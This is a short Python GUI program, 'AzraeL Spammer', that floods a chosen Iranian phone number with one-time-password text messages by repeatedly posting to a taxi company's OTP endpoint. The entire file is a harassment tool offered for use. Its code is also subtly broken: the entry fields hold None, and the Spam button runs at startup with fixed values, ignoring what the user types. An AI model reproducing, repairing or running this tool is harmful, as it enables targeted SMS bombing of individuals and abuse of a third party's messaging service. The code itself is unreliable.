from tkinter import *
from tkinter import ttk as tkinter
from tkinter import messagebox
import requests
import time

try:
    window = Tk()
    window.title('AzraeL Spammer')
    window.geometry('270x150')

    class Spammer:
        def __init__(self,phone,times,sleep):
            self.phone = phone
            self.times = times
            self.sleep = sleep
        def Spam(self):
            phone = self.phone
            times = self.times
            sleep = self.sleep
            for spam in range(1,times):
                time.sleep(sleep)
                requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp',data={"cellphone":"+98"+phone})

    def Start(phone,times,sleep):
        A = Spammer(phone,times,sleep)
        A.Spam()

    def alert():
        messagebox.showinfo('about programmer','Programmer AzraeL\n\nt.me:@iam_Azrael')

    tkinter.Label(window,text=' ').grid(row=0)
    tkinter.Label(window,text='Phone').grid(row=1)
    tkinter.Label(window,text='times').grid(row=3)
    tkinter.Label(window,text='sleep').grid(row=5)
    phone = tkinter.Entry(window).grid(row=1,column=1)
    tkinter.Label(window,text=' ').grid(row=2)
    times = tkinter.Entry(window).grid(row=3,column=1)
    tkinter.Label(window,text=' ').grid(row=4)
    sleep = tkinter.Entry(window).grid(row=5,column=1)
    tkinter.Label(window,text=' ').grid(row=6)

    tkinter.Label(window,text=' ').grid(row=1,column=2)
    but_spam = tkinter.Button(window,text='Spam',command=Start(phone=f'{phone}',times=10,sleep=2)).grid(row=1,column=3)
    tkinter.Label(window,text=' ').grid(row=3,column=2)
    but_quit = tkinter.Button(window,text='Quit',command=quit).grid(row=3,column=3)
    tkinter.Label(window,text=' ').grid(row=5,column=2)
    but_about_programmer = tkinter.Button(window,text='Programmer',command=alert).grid(row=5,column=3)

    window.mainloop()
except Exception:
    messagebox.showerror('Error!','Error!')
